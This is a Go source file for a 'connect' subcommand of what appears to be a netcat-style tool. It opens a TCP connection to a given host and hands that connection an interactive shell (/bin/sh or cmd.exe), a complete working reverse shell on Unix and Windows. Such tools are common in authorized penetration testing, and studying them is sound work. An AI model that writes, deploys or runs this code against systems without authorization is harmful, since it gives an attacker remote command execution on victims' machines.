package cmd

import (
	"fmt"
	"io"
	"net"
	"os/exec"
	"runtime"

	"github.com/fatih/color"
	"github.com/spf13/cobra"
	"github.com/ibrahmsql/gocat/internal/logger"
)

var (
	shellPath string
)

var connectCmd = &cobra.Command{
	Use:     "connect [host] <port>",
	Aliases: []string{"c"},
	Short:   "Connect to the controlling host",
	Long:    `Connect to a remote host and spawn a reverse shell.`,
	Args:    cobra.RangeArgs(1, 2),
	Run:     runConnect,
}

func init() {
	rootCmd.AddCommand(connectCmd)

	// Set default shell based on OS
	defaultShell := "/bin/sh"
	if runtime.GOOS == "windows" {
		defaultShell = "cmd.exe"
	}

	connectCmd.Flags().StringVarP(&shellPath, "shell", "s", defaultShell, "The shell to use")
}

func runConnect(cmd *cobra.Command, args []string) {
	var host, port string

	if len(args) == 1 {
		host = "127.0.0.1"
		port = args[0]
	} else {
		host = args[0]
		port = args[1]
	}

	if err := connect(host, port, shellPath); err != nil {
		logger.Fatal("Error: %v", err)
	}
}

func connect(host, port, shell string) error {
	address := net.JoinHostPort(host, port)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %v", address, err)
	}
	defer conn.Close()

	color.Green("Connected to %s", address)

	if runtime.GOOS == "windows" {
		return connectWindows(conn, shell)
	} else {
		return connectUnix(conn, shell)
	}
}

func connectUnix(conn net.Conn, shell string) error {
	// Create shell command
	cmd := exec.Command(shell, "-i")

	// Redirect stdin, stdout, stderr to the connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Start the shell
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start shell: %v", err)
	}

	// Wait for the shell to exit
	if err := cmd.Wait(); err != nil {
		logger.Warn("Shell exited with error: %v", err)
	} else {
		logger.Warn("Shell exited")
	}

	return nil
}

func connectWindows(conn net.Conn, shell string) error {
	// Create shell command
	cmd := exec.Command(shell)

	// Get pipes for stdin, stdout, stderr
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("failed to create stdin pipe: %v", err)
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return fmt.Errorf("failed to create stdout pipe: %v", err)
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		return fmt.Errorf("failed to create stderr pipe: %v", err)
	}

	// Start the shell
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start shell: %v", err)
	}

	// Copy data between connection and shell pipes
	go func() {
		if _, err := io.Copy(stdin, conn); err != nil {
			logger.Error("conn to stdin copy error: %v", err)
		}
		stdin.Close()
	}()

	go func() {
		if _, err := io.Copy(conn, stdout); err != nil {
			logger.Error("stdout to conn copy error: %v", err)
		}
	}()

	go func() {
		if _, err := io.Copy(conn, stderr); err != nil {
			logger.Error("stderr to conn copy error: %v", err)
		}
	}()

	// Wait for the shell to exit
	if err := cmd.Wait(); err != nil {
		logger.Warn("Shell exited with error: %v", err)
	} else {
		logger.Warn("Shell exited")
	}

	return nil
}